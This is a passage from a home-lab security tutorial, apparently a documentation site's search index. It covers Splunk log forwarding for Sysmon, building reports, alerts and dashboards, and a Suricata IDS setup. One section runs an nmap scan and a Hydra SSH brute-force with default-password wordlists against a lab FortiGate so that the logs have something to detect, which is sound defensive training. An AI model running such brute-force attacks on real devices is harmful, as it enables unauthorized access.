</p>"},{"location":"splunk/splunk.html#editing-config-files-for-sysmon-app","title":"Editing Config Files for Sysmon App","text":"<p>On the Splunk VM where Splunk Enterprise is installed, change into <code>/opt/splunk/etc/deployment-apps/Splunk_TA_microsoft_sysmon/local</code> ****directory. Copy <code>app.conf</code> and <code>inputs.conf</code> from <code>/opt/splunk/etc/deployment-apps/Splunk_TA_microsoft_sysmon/default</code> directory.</p> <pre><code>cd /opt/splunk/etc/deployment-apps/Splunk_TA_microsoft_sysmon/local\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_microsoft_sysmon/default/app.conf .\ncp /opt/splunk/etc/deployment-apps/Splunk_TA_microsoft_sysmon/default/inputs.conf .\n</code></pre> <p>Make the following changes to <code>inputs.conf</code> . Your index name must match with the index name you created earlier</p> <pre><code>nano inputs.conf\n</code></pre> <pre><code>[default]\nindex = sysmonlog\n\n[WinEventLog://Microsoft-Windows-Sysmon/Operational]\ndisabled = false\nrenderXml = 1\nsource = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\n\n[WinEventLog://WEC-Sysmon]\ndisabled = true\nrenderXml = 1\nsource = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\nsourcetype = XmlWinEventLog:WEC-Sysmon\nhost = WinEventLogForwardHost\n</code></pre> <p>On WS2019 host where Splunk Universal Forwarder is configured, navigate to </p> <p><code>C:\\Program Files\\SplunkUniversalForwarder\\etc\\apps\\Splunk_TA_microsoft_sysmon\\local</code> . Copy <code>app.conf</code> and <code>inputs.conf</code> from <code>C:\\Program Files\\SplunkUniversalForwarder\\etc\\apps\\Splunk_TA_microsoft_sysmon\\default</code> . Edit <code>inputs.conf</code> (same as above) </p> <p></p> <p>Restart Splunk Universal Forwarder. On PowerShell, change directory into <code>C:\\program files\\SplunkUniversalForwarder\\bin</code> . Run <code>./splunk restart</code> .</p> <pre><code>cd \"C:\\program files\\SplunkUniversalForwarder\\bin\"\n./splunk restart\n</code></pre> <pre><code>#Example output\nPS C:\\program files\\SplunkUniversalForwarder\\bin&gt; ./splunk restart\nSplunkForwarder: Stopped\n\nSplunk&gt; Another one.\n\nChecking prerequisites...\n        Checking mgmt port [8089]: open\n        Checking conf files for problems...\n        Done\n        Checking default conf files for edits...\n        Validating installed files against hashes from 'C:\\program files\\SplunkUniversalForwarder\\splunkforwarder-9.3.0-51ccf43db5bd-windows-64-manifest'\n        All installed files intact.\n        Done\nAll preliminary checks passed.\n\nStarting splunk server daemon (splunkd)...\n\nSplunkForwarder: Starting (pid 4824)\nDone\n\nPS C:\\program files\\SplunkUniversalForwarder\\bin&gt;\n</code></pre> <p>Verify that Sysmon logs are being indexed. </p> <p></p> <p>Search for <code>index=sysmonlog source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational</code></p> <pre><code>index=sysmonlog source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\n</code></pre> <p></p>"},{"location":"splunk/splunk.html#annex-installing-splunk-uf-on-windows-with-a-virtual-account","title":"Annex: Installing Splunk UF on Windows with a Virtual Account","text":"<p>Selecting Virtual Account will create a service account called <code>NT SERVICE\\SplunkForwarder</code>. For Sysmon Log Forwarding to work, <code>NT SERVCIE\\SplunkForwarder</code> must be assigned as a member of Event Log Readers group through Group Policy. If your Windows host is not joined to a domain and you have technical issues with the Virtual Account, use Local System but note that this is not best security practice. </p> <p></p> <p>Leave the values as default and click Next</p> <p></p> <p>Leave the values as default and click Next (Windows Event Logs forwarding will be configured later).</p> <p></p> <p>Create admin credentials.</p> <p></p> <p>Enter IP address of your Deployment Server (Splunk server) and port 8089.</p> <p></p> <p>Enter IP address of your Receiving Indexer (Splunk server) and port 9997.</p> <p></p> <p>Click Next and finish install. Navigate to C:\\Program Files\\SplunkUniversalForwarder. Right-click and select properties. Verify that Splunk Universal Forwarder is configured to run by virtual account SplunkForwarder.</p> <p></p> <p>Open Group Policy Management. Right click on domain name and select Create a GPO in this domain and link it here.</p> <p></p> <p>Name it as Restricted Groups.</p> <p></p> <p>Right click on Restricted Groups and click Edit.</p> <p></p> <p>Navigate to Restricted Groups and Add Group.</p> <p></p> <p>Click Browse.</p> <p></p> <p>Type event log readers and click Check Names. Make sure that the names is underlined. Click OK.</p> <p></p> <p>Add NT SERVICE\\SplunkForwarder as a member of this group. Click OK. Click Apply and OK.</p> <p></p> <p>Verify the configuration.</p> <p></p> <p>On Command Prompt as Administrator run the following command to update Group Policy:</p> <pre><code>gpupdate /force\n</code></pre> <pre><code>#Example output\nC:\\Users\\Administrator&gt;gpupdate /force\nUpdating policy...\n\nComputer Policy update has completed successfully.\nUser Policy update has completed successfully.\n</code></pre> <p>Restart Splunk UF. If Sysmon logs are not being ingested by Splunk, check Channel Access setting for Sysmon. It is likely that SplunkForwarder is not added to the Channel Access.</p> <pre><code>wevtutil gl \"Microsoft-Windows-Sysmon/Operational\"\n</code></pre> <p>Get SecurityIdentifier(sid) of SplunkForwarder by running this PowerShell script.</p> <pre><code>$user = [System.Security.Principal.NTAccount]\"NT SERVICE\\SplunkForwarder\"\n$sid = $user.Translate([System.Security.Principal.SecurityIdentifier])\nWrite-Output $sid.Value\n</code></pre> <p>Add SplunkForwarder to Channel Access by running the command below. Add your sid of SplunkForwarder</p> <pre><code>wevtutil sl \"Microsoft-Windows-Sysmon/Operational\" /ca:\"O:BAG:SYD:(A;;0x2;;;S-1-15-2-1)(A;;0x2;;;S-1-5-80-972488765-139171986-783781252-3188962990-3730692313)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x1;;;BO)(A;;0x1;;;SO)(A;;0x1;;;S-1-5-32-573)\"\n</code></pre> <p>Restart Splunk UF.</p>"},{"location":"splunk/splunk.html#introduction-to-splunk","title":"Introduction to Splunk","text":"<p>Splunk offers free training. You will need to create a user account to access free training materials. The following content is available from the free course \u201cIntroduction to Splunk.\u201d Alternatively, same contents are available from SplunkHowTo YouTube channel.</p> <p>Refer to Ingesting FortiGate Logs through SC4S and configure Syslog Logging on FortiGate on port 514. </p>"},{"location":"splunk/splunk.html#attack-simulation","title":"Attack Simulation","text":"<p>Run nmap scan against FortiGate VM\u2019s internal IP address. From the nmap scan result, we can see that port 22 for ssh is open and belongs to FortiGate. </p> <pre><code>nmap -sC -sV 10.0.0.1 -v\n</code></pre> <pre><code>#Example output\nPORT    STATE  SERVICE   VERSION\n22/tcp  open   ssh       FortiSSH (protocol 2.0)\n| ssh-hostkey: \n|   256 63:3a:d1:25:e2:97:c3:52:e8:00:77:b5:0f:db:2d:9a (ECDSA)\n|   384 41:0d:b6:d0:af:43:08:fe:5b:64:e3:de:7f:80:6c:82 (ECDSA)\n|   521 1f:ac:5e:96:a2:70:a5:ea:f2:3f:e4:12:fd:23:aa:94 (ECDSA)\n|_  256 45:77:22:18:b8:13:bb:6d:60:bf:87:91:95:f3:d9:02 (ED25519)\n113/tcp closed ident\n443/tcp open   ssl/https\n| ssl-cert: Subject: commonName=FortiGate/organizationName=Fortinet Ltd./stateOrProvinceName=California/countryName=US\n| Subject Alternative Name: IP Address:192.168.1.10, IP Address:10.0.0.1\n| Issuer: commonName=FGVMEVMBF57GNJF3/organizationName=Fortinet/stateOrProvinceName=California/countryName=US\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2025-02-25T22:28:01\n| Not valid after:  2027-05-31T22:28:01\n| MD5:   1757:d25d:ec8e:5eae:92ef:1b01:91a6:9fb1\n|_SHA-1: 9246:9b61:fbab:1a64:aeac:da55:7ebf:277f:05e5:65ec\n&lt;SNIP&gt;\n</code></pre> <p>Create a usernames text file containing default usernames for FortiGate. Create a passwords text file containing passwords.</p> <pre><code>nano usernames.txt\n</code></pre> <pre><code>admin\nadministrator\nadm\nfortigate\n</code></pre> <pre><code>nano passwords.txt\n</code></pre> <pre><code>P@ssw0rd\npassword\npassword123\nqwerty\nadmin\n</code></pre> <p>Using the usernames and passwords text file, run Hydra to perform a brute-force attack on FortiGate's SSH service.</p> <pre><code>hydra -L usernames.txt -P passwords.txt ssh://10.0.0.1 \n</code></pre> <pre><code>#Example output\n\u2514\u2500$ hydra -L usernames.txt -P passwords.txt ssh://10.0.0.1 \n\nHydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-27 14:25:56\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 24 login tries (l:4/p:6), ~2 tries per task\n[DATA] attacking ssh://10.0.0.1:22/\n[22][ssh] host: 10.0.0.1   login: admin   password: admin\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] ssh target does not support password auth\n[ERROR] all children were disabled due too many connection errors\n0 of 1 target successfully completed, 1 valid password found\n[INFO] Writing restore file because 2 server scans could not be completed\n[ERROR] 1 target was disabled because of too many errors\n[ERROR] 1 targets did not complete\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-27 14:25:57\n</code></pre> <p>To generate failed login events from multiple different hosts, SSH into the FortiGate using a valid username but a random password. </p> <p>From Splunk and Ubuntu VM:</p> <pre><code>ssh admin@10.0.0.1\n</code></pre> <pre><code>#Example output\nThe authenticity of host '10.0.0.1 (10.0.0.1)' can't be established.\nED25519 key fingerprint is SHA256:zuocT3kebXHrIVyokxu2EKQTKhuxG/ikAQb2K+uZY54.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '10.0.0.1' (ED25519) to the list of known hosts.\nadmin@10.0.0.1's password: \nPermission denied, please try again.\nadmin@10.0.0.1's password: \nPermission denied, please try again.\nadmin@10.0.0.1's password: \nReceived disconnect from 10.0.0.1 port 22:2: Too many authentication failures\nDisconnected from 10.0.0.1 port 22\n</code></pre> <p>To generate login successful events, SSH into FortiGate using a valid credentials. You will need to wait until the connection is reset by FortiGate.</p> <p>From Splunk and Ubuntu VM:</p> <pre><code>ssh admin@10.0.0.1\n</code></pre> <pre><code>WARNING: File System Check Recommended! An unsafe reboot may have caused an inconsistency in the disk drive.\nIt is strongly recommended that you check the file system consistency before proceeding.\nPlease run 'execute disk list' and then 'execute disk scan &lt;ref#&gt;'.\nNote: The device will reboot and scan the disk during startup. This may take up to an hour.\nFGVMEVMBF57GNJF3 # exit\nConnection to 10.0.0.1 closed.\n</code></pre>"},{"location":"splunk/splunk.html#creating-reports","title":"Creating Reports","text":"<p>On Splunk Enterprise web UI, search for login failed events on FortiGate.</p> <pre><code>index=* sourcetype=\"fortigate_event\" login failed\n</code></pre> <p>Select srcip from Interesting Fields, then select Top values.</p> <p></p> <p>This will visualise data as a bar chart. Save As Report.</p> <p></p> <p>Set Title as Security_Report_Failed_SSH_Login_Attempts. Set Content as Bar Chart. Select Yes for Time Range Picker. Click Save.</p> <p></p> <p>Select View</p> <p></p> <p>Select Time Range as All time and click Reports.</p> <p></p> <p>Edit Permissions for Security_Report_Failed_SSH_Login_Attempts.</p> <p></p> <p>Select following options:</p> <ul> <li>Display For App</li> <li>Run As User</li> <li>Assign Read to Everyone</li> </ul> <p>Click Save</p> <p></p> <p>Edit Schedule (optional). Scheduling Report can reduce strain on your environment caused by repeatedly running new ad-hoc searches. Select Schedule and Time Range of your preference (leave as default). Click Save.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#creating-alerts","title":"Creating Alerts","text":"<p>On Splunk Enterprise web UI, search for Admin login failed events on FortiGate.</p> <pre><code>index=* sourcetype=\"fortigate_event\" login failed\n</code></pre> <p>Save As Alert</p> <p></p> <p>Set Title as FortiGate Login Failures. Set Permissions to Private. Set Alert type as Schedules to Run every hours and Expire after 24 hours. Set Trigger Conditions to trigger alert when Number of Results is greater than 10 and trigger Once. Select Throttle (after an alert is triggered, subsequent alerts will not be triggered until after the throttle period). Suppress trigger for 60 seconds. Set Trigger Actions to Add to Trigger Alerts with High Severity. Click Save. </p> <p></p> <p></p> <p>Click Permissions</p> <p></p> <p>Select Display For App. Assign Read access to Everyone. Click Save.</p> <p></p> <p>Select Edit Alert again</p> <p></p> <p>Change Alert type to Real-time. Suppress all fields containing field value by entering a asterisk. Click Save.</p> <p></p> <p>Click Triggered Alerts.</p> <p></p> <p>Alternatively, Triggered Alerts can be viewed on the Activity tab (Activity &gt; Triggered Alerts). If you don\u2019t see your alerts, manually trigger alerts by running Hydra on Kali VM. </p> <p></p> <p>Alerts and Reports can also be viewed from Setting &gt; Searches, reports, and alerts</p> <p></p>"},{"location":"splunk/splunk.html#creating-dashboards","title":"Creating Dashboards","text":"<p>On Splunk Enterprise web UI, search for login failed events on FortiGate.</p> <pre><code>index=* sourcetype=\"fortigate_event\" login failed\n</code></pre> <p></p> <p>From the Interesting Fields panel, Select more fields. </p> <p></p> <p>Search for user and select user_name, then close the window.</p> <p></p> <p>The selected user_name field should now appear in the selected fields. Select user_name then top values. </p> <p></p> <p>This will generate a Visualisation that is most suitable for our data.</p> <p></p> <p>Select Bar Chart and select Pie Chart.</p> <p></p> <p>Select Save As, then New Dashboard.</p> <p></p> <p>Set Dashboard Title as \u201cFortiGate Logins\u201d and leave Permissions as Private. Select Classic Dashboards (we will explore Dashboard Studio later). Set Panel Title as \u201cFailed Logins by User.\u201d Set Visualization Type as Pie Chart. Save to Dashboard. </p> <p></p> <p>View Dashboard</p> <p></p> <p></p> <p>Go back to Search and search for FortiGate login events (not login failed). </p> <pre><code>index=* sourcetype=\"fortigate_event\" login\n</code></pre> <p>In the Interesting Fields panel, select logdesc, then Top values by time</p> <p></p> <p>This shows the login trends over time as a line chart.</p> <p></p> <p>Select Format, then Legend. Select Legend Position as Left. This positions the legend to the left. </p> <p></p> <p></p> <p>Select General. Select Min/Max in Show Data Values. This shows data values on the peak of the graph.</p> <p></p> <p>Save As Existing Dashboard. Select FortiGate Logins. Save to Dashboard.</p> <p></p> <p>View Dashboard</p> <p></p> <p></p> <p>Click Edit on top right. Add Panel. Select New from Report. Select Security_Report_Failed_SSH_Login_Attempts. Select Add to Dashboard</p> <p></p> <p>Drag and Drop Bar Chart next to the Pie Chart. Edit Drilldown on the Pie Chart.</p> <p></p> <p>Set Drilldown Action On click to Link to Search. Click Apply.</p> <p></p> <p>Save the Dashboard.</p> <p></p> <p>Since we configured Link to Search, clicking 'admin' on the pie chart will redirect you to the Search and Reporting page with the search query automatically populated.</p> <p></p>"},{"location":"splunk/splunk.html#cloning-in-dashboard-studio","title":"Cloning in Dashboard Studio","text":"<p>While the FortiGate Logins Dashboard is open, select Clone in Dashboard Studio.</p> <p></p> <p>Set Title as FortiGate Logins - Dashboard Studio. Select Grid layout. Click Convert &amp; Save.</p> <p></p> <p>Click Save. If Save button is greyed out, toggle Add submit button then click Save. Click View. We have successfully cloned the dashboard in dashboard studio.</p> <p></p> <p></p>"},{"location":"splunk/splunk.html#references","title":"References","text":"<ul> <li>https://youtu.be/gNeF_mT6Eng?si=No3aBK1EDt_LuK80</li> <li>https://youtu.be/Wze0yXsMKVM?si=N6Y4iW3m5ewxD1Hv</li> <li>https://youtu.be/Iol1CHyv23A?si=ZWXFI-QOZVA8BUaa</li> <li>https://youtu.be/zFosqdAadJg?si=mn5HtZHhud3jkcPR</li> <li>https://docs.splunk.com/Documentation/Splunk/9.3.0/Installation/Whatsinthismanual</li> <li>https://community.splunk.com/t5/Getting-Data-In/Sysmon-events-not-getting-indexed/m-p/688793?lightbox-message-images-688793=31015i33DABC9A02E482CD#M114683</li> <li>https://youtu.be/1Ur3xDNaE4s?si=Dfh4-4PDkOccbnTR</li> <li>https://splunk.github.io/splunk-connect-for-syslog/main/</li> <li>https://gitlab.com/J-C-B/community-splunk-scripts/-/tree/master/</li> <li>https://youtu.be/zWkGVnsNY8M?si=9iNqCFLlktpQq6qQ</li> <li>https://youtu.be/Xepw_Xk9HX8?si=-D53cGVAs7Ckcrp6</li> <li>https://youtu.be/8jvEmAmQNug?si=tc2tzJh4uOG9I62V</li> <li>https://youtu.be/uQUAvY5M3RU?si=JKk_M_60LLsvk0w6</li> <li>https://youtu.be/2kU1ZTAZphY?si=H3zP0QD9m8MmL2bG</li> </ul>"},{"location":"suricata/suricata.html","title":"Suricata","text":""},{"location":"suricata/suricata.html#suricata","title":"Suricata","text":"<p>Suricata is an open-source network threat detection engine developed by the Open Information Security Foundation (OISF). It provides capabilities for real-time intrusion detection (IDS), inline intrusion prevention (IPS), network security monitoring (NSM), and offline packet capture (pcap) processing. </p>"},{"location":"suricata/suricata.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, instead of simulating attacks, the Windows host acted as a compromised machine where malicious websites were visited to trigger alerts in a safe and controlled setting.</p> Host OS Role IP Address pfsense FreeBSD (pfSense v2.7.2) Firewall/Router (Gateway IDS/IPS) 192.168.1.200 (WAN) / 10.0.0.2 (LAN) Suricata Ubuntu 22.04 LTS Host IDS/IPS 10.0.0.27 WS2019 Windows Server 2019 Compromised machine 10.0.0.24 <p></p>"},{"location":"suricata/suricata.html#install-suricata-on-host","title":"Install Suricata on Host","text":"<p>In this demonstration, we will be installing Suricata on the Ubuntu virtual machine. We will be simulating install in an air-gapped environment but note that some parts of the step requires internet connection.</p> <p>On a Ubuntu machine with internet access Add the necessary repository for Suricata:</p> <pre><code>sudo apt-get install software-properties-common\nsudo add-apt-repository ppa:oisf/suricata-stable\nsudo apt-get update\n</code></pre> <p>Create a directory to store Suricata. Adjust the directory permissions:</p> <pre><code>sudo mkdir ~/suricata-offline\ncd ~/suricata-offline\nsudo chmod 755 ~/suricata-offline\n</code></pre> <p>Download the Suricata package and all its dependencies:</p> <p>Download the Emerging Threats Open rule set:</p> <pre><code>sudo apt-get download suricata\nsudo wget https://rules.emergingthreats.net/open/suricata-7.0.6/emerging.rules.tar.gz\n</code></pre> <p>Create a directory to store dependencies. Adjust the directory permissions:</p> <pre><code>sudo mkdir dependencies\ncd dependencies\nsudo chmod 755 ~/suricata-offline/dependencies\n</code></pre> <p>Download the required dependencies</p> <pre><code>sudo apt-get download autoconf automake build-essential cargo cbindgen \\\n    libjansson-dev libpcap-dev libpcre2-dev libtool libyaml-dev make \\\n    pkg-config rustc zlib1g-dev libc6-dev gcc g++ dpkg-dev binutils \\\n    libpcre2-16-0 libpcre2-posix3 libdpkg-perl libstd-rust-dev libssh2-1 \\\n    libpcap0.8-dev m4 autotools-dev binutils-common libbinutils \\\n    binutils-x86-64-linux-gnu g++-11 gcc-11 libc-dev-bin linux-libc-dev \\\n    libcrypt-dev rpcsvc-proto libtirpc-dev libnsl-dev libdbus-1-dev \\\n    libstd-rust-1.75 libctf-nobfd0 libctf0 lto-disabled-list libstdc++-11-dev \\\n    libcc1-0 libgcc-11-dev libsigsegv2 libc6=2.35-0ubuntu3.8 libitm1 \\\n    libasan6 liblsan0 libtsan0 libubsan1 libquadmath0 \\\n    libevent-pthreads-2.1-7 libhiredis0.14 libhtp2 libhyperscan5 \\\n    libluajit-5.1-2 libnet1 libnetfilter-queue1 libluajit-5.1-common \\\n    liblzma-dev libevent-core-2.1-7 curl jq libcurl4=7.81.0-1ubuntu1.17 libjq1=1.6-2.1ubuntu3 libonig5 libc6-dbg libc6 zlib1g\n</code></pre> <p>Transfer suricata-offline folder to /opt directory in Ubuntu machine without internet access. </p> <p>Install dependencies and suricata</p> <pre><code>cd /opt/suricata-offline/dependencies\nsudo dpkg -i *\n</code></pre> <p>Install Suricata</p> <pre><code>cd /opt/suricata-offline/\nsudo dpkg -i suricata_1%3a7.0.6-0ubuntu2_amd64.deb\n</code></pre> <p>After installing Suricata, you can check which version of Suricata you have running and with what options, as well as the service state:</p> <p>Suricata is running in exited state, which typically indicates that the service started successfully and then exited without issues because it's running in IDS mode.</p> <pre><code>sudo suricata --build-info\nsudo systemctl status suricata\n</code></pre>"},{"location":"suricata/suricata.html#basic-setup","title":"Basic setup","text":"<p>First, determine the interface(s) and IP address(es) on which Suricata should be inspecting network packets:</p> <pre><code>ip a\n...\n2: ens32: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000\n    link/ether 00:0c:29:51:ef:1b brd ff:ff:ff:ff:ff:ff\n    altname enp2s0\n    inet 10.0.0.25/24 brd 10.0.0.255 scope global noprefixroute ens32\n</code></pre> <p>Use that information to configure Suricata:</p> <pre><code>sudo nano /etc/suricata/suricata.yaml\n</code></pre> <p>Specify internal network in the HOME_NET </p> <p>Specify network interface in af-packet and pcap.</p> <p>Set use-mmap to yes.</p> <p>Set community-id to true</p> <pre><code>vars:\n  # more specific is better for alert accuracy and performance\n  address-groups:\n    HOME_NET: \"[10.0.0.0/24]\"\n...\ncommunity-id: true\n...\naf-packet:\n    - interface: ens32\n      cluster-id: 99\n      cluster-type: cluster_flow\n      defrag: yes\n      use-mmap: yes\n...\n# Cross platform libpcap capture support\npcap:\n  - interface: ens32\n\n checksum-validation: no\n</code></pre>"},{"location":"suricata/suricata.html#suricata-update-offline","title":"Suricata-update offline","text":"<p>Run <code>suricata-update</code> to update rules and create /var/lib/suricata folder</p> <p>Note it is expected to get the error \u201cFailed to fetch https://rules.emergingthreats.net/open/suricata-7.0.6/emerging.rules.tar.gz:\u201d</p> <pre><code>sudo suricata-update\n</code></pre> <p>Make a folder called suricata-rules and extract <code>emerging.rules.tar.gz</code> to that directory</p> <pre><code>sudo mkdir suricata-rules\nsudo tar -xvzf emerging.rules.tar.gz -C /opt/suricata-offline/suricata-rules/\n</code></pre> <p>Append the rules from the file to the main /var/lib/suricata/rules/suricata.rules file</p> <pre><code>sudo bash -c 'find /opt/suricata-offline/suricata-rules/rules/ -name \"*.rules\" -exec cat {} + &gt;&gt; /var/lib/suricata/rules/suricata.rules'\n</code></pre>"},{"location":"suricata/suricata.html#suricata-update-online-recommended","title":"Suricata-update online (recommended)","text":"<p>Running suricata-update with internet connection simplifies the process of downloading and installing rulesets.</p> <pre><code>sudo suricata-update\n</code></pre> <p>You can also list sources and download rules from a specific source</p> <pre><code>sudo suricata-update list-sources\n</code></pre> <p>Summary of different license types:</p> <ul> <li>MIT is very permissive, allowing almost any use, even commercial.</li> <li>Commercial requires you to pay or subscribe for usage rights, often with strict terms.</li> <li>CC-BY-SA-4.0 requires you to give credit and share any modifications under the same license.</li> <li>GPL-3.0 requires sharing modifications under the same open-source license and offering the source code.</li> <li>Non-Commercial restricts usage to personal or non-commercial contexts.</li> </ul> <p>To download the ruleset from a specific source, run:</p> <p>If required, update sources</p> <pre><code>sudo suricata-update update-sources\nsudo suricata-update enable-source &lt;Name&gt;\nsudo suricata-update\n</code></pre> <p>Test Suricata configuration file by running</p> <pre><code>sudo suricata -T -c /etc/suricata/suricata.yaml -v\n</code></pre> <pre><code>#Example output\n\nNotice: suricata: This is Suricata version 7.0.6 RELEASE running in SYSTEM mode\nInfo: cpu: CPUs/cores online: 2\nInfo: suricata: Running suricata under test mode\nInfo: suricata: Setting engine mode to IDS mode by default\nInfo: exception-policy: master exception-policy set to: auto\nInfo: logopenfile: fast output device (regular) initialized: fast.log\nInfo: logopenfile: eve-log output device (regular) initialized: eve.json\nInfo: logopenfile: stats output device (regular) initialized: stats.log\nInfo: detect: 1 rule files processed. 39802 rules successfully loaded, 0 rules failed, 0\nInfo: threshold-config: Threshold config parsed: 0 rule(s) found\nInfo: detect: 39805 signatures processed. 1158 are IP-only rules, 4116 are inspecting packet payload, 34321 inspect application layer, 108 are decoder event only\nNotice: suricata: Configuration provided was successfully loaded. Exiting.\n</code></pre> <p>Note the difference in number of signatures processed, inspecting packet payload and inspect application layers when suricata-update was executed without internet access:</p> <pre><code>Info: detect: 39669 signatures processed. 1158 are IP-only rules, 4110 are inspecting packet payload, 34193 inspect application layer, 108 are decoder event only\nNotice: suricata: Configuration provided was successfully loaded. Exiting.\n</code></pre>"},{"location":"suricata/suricata.html#running-suricata","title":"Running Suricata","text":"<p>With the rules installed, Suricata can run properly and thus we restart it:</p> <pre><code>sudo systemctl restart suricata\n</code></pre> <p>To make sure Suricata is running check the Suricata log:</p> <pre><code>sudo tail /var/log/suricata/suricata.log\n</code></pre> <p>The last line will be similar to this:</p> <pre><code>5933 - Suricata-Main] 2024-09-12 13:26:11 Notice: threads: Threads created -&gt; W: 2 FM: 1 FR: 1   Engine started.\n</code></pre> <p>The actual thread count will depend on the system and the configuration.</p> <p>To see statistics, check the\u00a0<code>stats.log</code>\u00a0file:</p> <pre><code>sudo tail -f /var/log/suricata/stats.log\n</code></pre> <p>By default, it is updated every 8 seconds to show updated values with the current state, like how many packets have been processed and what type of traffic was decoded.</p>"},{"location":"suricata/suricata.html#alerting","title":"Alerting","text":"<p>To test the IDS functionality of Suricata it's best to test with a signature. The signature with ID\u00a0<code>2100498</code>\u00a0from the ET Open ruleset is written specific for such test cases.</p> <p>2100498:</p> <pre><code>alert ip any any -&gt; any any (msg:\"GPL ATTACK_RESPONSE id check returned root\"; content:\"uid=0|28|root|29|\"; classtype:bad-unknown; sid:2100498; rev:7; metadata:created_at 2010_09_23, updated_at 2010_09_23;)\n</code></pre> <p>The syntax and logic behind those signatures is covered in other chapters. This will alert on any IP traffic that has the content within its payload. This rule can be triggered quite easy. Before we trigger it, start\u00a0<code>tail</code>\u00a0to see updates to\u00a0<code>fast.log</code>.</p> <pre><code>curl http://testmynids.org/uid/index.html\nsudo tail /var/log/suricata/fast.log\n</code></pre> <p>The following output should now be seen in the log:</p> <pre><code>09/12/2024-13:51:32.520238  [**] [1:2100498:7] GPL ATTACK_RESPONSE id check returned root [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 65.9.141.53:80 -&gt; 10.0.0.25:34606Alerts:\n</code></pre> <p>This should include the timestamp and the IP of your system.</p>"},{"location":"suricata/suricata.html#custom-rules","title":"Custom rules","text":"<p>Stop Suricata service:</p> <pre><code>sudo systemctl stop suricata\n</code></pre> <p>Create local.rules</p> <pre><code>sudo nano /usr/share/suricata/rules/local.rules\n</code></pre> <p>Write following rule to alert on ping to internal network (note syntax is very similar to Snort)</p> <pre><code>alert icmp any any -&gt; $HOME_NET any (msg: \"ICMP Ping Detected\"; sid:1; rev:1;)\n</code></pre> <p>Edit suricata.yml</p> <pre><code>sudo nano /etc/suricata/suricata.yaml \n</code></pre> <p>Add local.rules to rule-files</p> <pre><code>default-rule-path: /var/lib/suricata/rules\n\nrule-files:\n  - suricata.rules\n  - /usr/share/suricata/rules/local.rules\n</code></pre> <p>Test Suricata configuration:</p> <pre><code>sudo suricata -T -c /etc/suricata/suricata.yaml -v\n</code></pre> <p>Start Suricata and verify it is running and active. </p> <pre><code>sudo systemctl start suricata\nsudo systemctl status suricata\n</code></pre> <p>Execute ping to Suricata host from another host in internal network</p> <p>Verify that the alerts have been logged</p> <pre><code>sudo tail /var/log/suricata/fast.log\n</code></pre> <pre><code>09/12/2024-14:14:31.052314  [**] [1:1:1] ICMP Ping Detected [**] [Classification: (null)] [Priority: 3] {ICMP} 10.0.0.25:0 -&gt; 10.0.0.20:0\n09/12/2024-14:14:57.907164  [**] [1:1:1] ICMP Ping Detected [**] [Classification: (null)] [Priority: 3] {ICMP} 10.0.0.20:3 -&gt; 10.0.0.1:3\n</code></pre>"},{"location":"suricata/suricata.html#eve-json","title":"EVE JSON","text":"<p>The more advanced output is the EVE JSON output which is explained in detail in\u00a0Eve JSON Output. To see what this looks like it's recommended to use\u00a0<code>jq</code>\u00a0to parse the JSON output. Alerts:</p> <pre><code>sudo tail /var/log/suricata/eve.json | jq 'select(.event_type==\"alert\")'\n</code></pre> <p>This will display more detail about each alert with a better readability, including meta-data.</p> <pre><code>{\n  \"timestamp\": \"2024-09-12T14:21:18.932116+1200\",\n  \"flow_id\": 1750955545135946,\n  \"in_iface\": \"ens32\",\n  \"event_type\": \"alert\",\n  \"src_ip\": \"10.0.0.25\",\n  \"src_port\": 0,\n  \"dest_ip\": \"10.0.0.20\",\n  \"dest_port\": 0,\n  \"proto\": \"ICMP\",\n  \"icmp_type\": 0,\n  \"icmp_code\": 0,\n  \"pkt_src\": \"wire/pcap\",\n  \"community_id\": \"1:7Z0C1taw8mzKweAktDBR9AYDoBA=\",\n  \"alert\": {\n    \"action\": \"allowed\",\n    \"gid\": 1,\n    \"signature_id\": 1,\n    \"rev\": 1,\n    \"signature\": \"ICMP Ping Detected\",\n    \"category\": \"\",\n    \"severity\": 3\n  },\n  \"direction\": \"to_client\",\n  \"flow\": {\n    \"pkts_toserver\": 1,\n    \"pkts_toclient\": 1,\n    \"bytes_toserver\": 98,\n    \"bytes_toclient\": 98,\n    \"start\": \"2024-09-12T14:21:18.931964+1200\",\n    \"src_ip\": \"10.0.0.20\",\n    \"dest_ip\": \"10.0.0.25\"\n  }\n}\n</code></pre> <p>Stats:</p> <pre><code>sudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type==\"stats\")|.stats.capture.kernel_packets'\nsudo tail -f /var/log/suricata/eve.json | jq 'select(.event_type==\"stats\")'\n</code></pre> <p>The first example displays the number of packets captured by the kernel; the second examples shows all of the statistics.</p>"},{"location":"suricata/suricata.html#setting-up-ips-inline-for-linux","title":"Setting up IPS inline for Linux","text":""},{"location":"suricata/suricata.html#setting-up-ips-with-netfilter","title":"Setting up IPS with Netfilter","text":"<p>To check if you have NFQ enabled in your Suricata build, enter the following command:</p> <pre><code>suricata 